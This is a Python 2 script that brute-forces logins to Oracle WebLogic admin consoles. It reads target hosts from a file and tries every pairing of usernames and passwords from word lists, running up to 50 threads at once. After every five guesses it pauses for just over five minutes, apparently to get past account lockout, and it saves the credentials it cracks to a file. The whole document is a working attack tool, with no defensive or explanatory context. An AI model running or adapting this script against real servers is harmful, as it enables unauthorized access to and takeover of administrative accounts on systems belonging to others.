import requests
import time
import threading
import traceback
import sys

RETRY=3
MAX_THREAD=50

class Brute:
	def __init__(self):
		self.success=0
		self.fail=0
		self.error=0
		self.success_list=[]
		self.error_list=[]
	def _do_login(self,url,usr,pwd):
		data = {'j_username': usr, 'j_password': pwd}
		count=0
		while count < RETRY:
			try:
				s = requests.post('http://%s/console/j_security_check'%url, data=data, timeout=5)
				if s.content.count('Home Page') != 0 or s.content.count('WebLogic Server Console') != 0 or s.content.count('console.portal') != 0:
					print 'Success!!!!! %s %s/%s                                                                                    ' % (url, usr, pwd)
					self.success += 1
					self.success_list.append(url)
					f = open('success.txt', 'a')
					f.write('%s %s/%s' % (url, usr, pwd))
					f.close()
					return True
				else:
					return False
			except:
				# traceback.print_exc()
				count+=1
				time.sleep(1)
		self.error+=1
		self.error_list.append(url)
		f=open('error.txt','a')
		f.write('%s\n'%url)
		f.close()

	def _main(self):
		for usr in open('usr.txt').readlines():
			count=0
			usr=usr.strip()
			for pwd in open('pwd.txt').readlines():
				count+=1
				pwd=pwd.strip()
				if count == 6:
					sec=310
					while sec != 0:
						print "Waiting,%s                                         \r" %sec,
						sec-=1
						time.sleep(1)
					count=1
				with open(sys.argv[1]) as f:
					for url in f:
						if url not in self.success_list:
							if url not in self.error_list:
								url=url.strip()
								t = threading.Thread(target=self._do_login, args=(url,usr,pwd))
								t.daemon = True
								while True:
									if threading.active_count() < MAX_THREAD:
										t.start()
										print "Current threads: %d,Success:%d,Error:%d\r" % (threading.active_count(),self.success,self.error ),
										break
									else:
										time.sleep(1)

if __name__ == '__main__':
	run=Brute()
	run._main()
